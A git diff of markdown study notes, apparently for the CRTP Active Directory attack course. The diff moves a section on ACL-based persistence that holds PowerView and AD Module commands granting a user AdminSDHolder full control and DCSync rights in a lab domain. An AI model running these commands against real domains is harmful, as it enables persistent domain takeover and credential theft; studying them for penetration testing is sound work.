@@ -18,8 +18,8 @@
   - [Silver](https://github.com/conma293/CRTP/blob/main/%23Commands%20Ref.md#silver)
   - [Invoke-Mimikatz.ps1](https://github.com/conma293/CRTP/blob/main/%23Commands%20Ref.md#invoke-mimikatz)
   - [Misc Attacks](https://github.com/conma293/CRTP/blob/main/%23Commands%20Ref.md#mimikatz---misc-attacks)
-- [Persistence using ACLs - Rights Abuse (AdminSDHolder and Domain Replication Privileges)](https://github.com/conma293/CRTP/blob/main/%23Commands%20Ref.md#persistence-using-acls---rights-abuse)
 - [Check ACLs](https://github.com/conma293/CRTP/blob/main/%23Commands%20Ref.md#check-acls)
+- [Persistence using ACLs - Rights Abuse (AdminSDHolder and Domain Replication Privileges)](https://github.com/conma293/CRTP/blob/main/%23Commands%20Ref.md#persistence-using-acls---rights-abuse)
 - [Persistence using ACLs - Security Descriptors (Remote WMI, PS Remoting, and Remote Registry)](https://github.com/conma293/CRTP/blob/main/%23Commands%20Ref.md#persistence-using-acls---security-descriptors)
 - [Privilege Escalation - Kerberoasting](https://github.com/conma293/CRTP/blob/main/%23Commands%20Ref.md#kerberoasting)
 - [Privilege Escalation - Targeted Kerberoasting - AS-REPs](https://github.com/conma293/CRTP/blob/main/%23Commands%20Ref.md#targeted-kerberoasting---as-reps)
@@ -347,23 +347,6 @@ misc::skeleton
 * * *
 
 
-
-# Persistence Using ACLs - Rights Abuse
-#### AdminSDHolder 
-
-•  Add FullControl permissions ("GenericAll" rights) for an arbitrary user to AdminSDHolder 
-
-```Add-ObjectAcl -TargetADSprefix 'CN=AdminSDHolder,CN=System' -PrincipalSamAccountName Mary -Rights All -Verbose``` - PowerView
-
-```Set-ADACL -DistinguishedName 'CN=AdminSDHolder,CN=System,DC=bcorp,DC=ecorp,DC=lab' -Principal Mary -Verbose``` - AD Module
-
-#### Domain Replication Privileges 
-•  Add DCSync rights ("Replicating Directory Changes*" (x3) permissions) - https://adsecurity.org/?p=1729) for an arbitrary user 
-
-```Add-ObjectAcl -TargetDistinguishedName 'DC=bcorp,DC=ecorp,DC=lab' -PrincipalSamAccountName Mary -Rights DCSync -Verbose``` - PowerView
-
-```Set-ADACL -DistinguishedName 'DC=bcorp,DC=ecorp,DC=lab' -Principal Mary -GUIDRight DCSync -Verbose``` - AD Module
-
 # Check ACLs
 Check Domain Admins permissions for a specific user:
 
@@ -401,6 +384,23 @@ Get-DomainObjectAcl -Identity Josh -ResolveGUIDs | Foreach-Object {$_ | Add-Memb
 ```
 
 * * * 
+
+# Persistence Using ACLs - Rights Abuse
+#### AdminSDHolder 
+
+•  Add FullControl permissions ("GenericAll" rights) for an arbitrary user to AdminSDHolder 
+
+```Add-ObjectAcl -TargetADSprefix 'CN=AdminSDHolder,CN=System' -PrincipalSamAccountName Mary -Rights All -Verbose``` - PowerView
+
+```Set-ADACL -DistinguishedName 'CN=AdminSDHolder,CN=System,DC=bcorp,DC=ecorp,DC=lab' -Principal Mary -Verbose``` - AD Module
+
+#### Domain Replication Privileges 
+•  Add DCSync rights ("Replicating Directory Changes*" (x3) permissions) - https://adsecurity.org/?p=1729) for an arbitrary user 
+
+```Add-ObjectAcl -TargetDistinguishedName 'DC=bcorp,DC=ecorp,DC=lab' -PrincipalSamAccountName Mary -Rights DCSync -Verbose``` - PowerView
+
+```Set-ADACL -DistinguishedName 'DC=bcorp,DC=ecorp,DC=lab' -Principal Mary -GUIDRight DCSync -Verbose``` - AD Module
+
 
 # Persistence Using ACLs - Security Descriptors
 
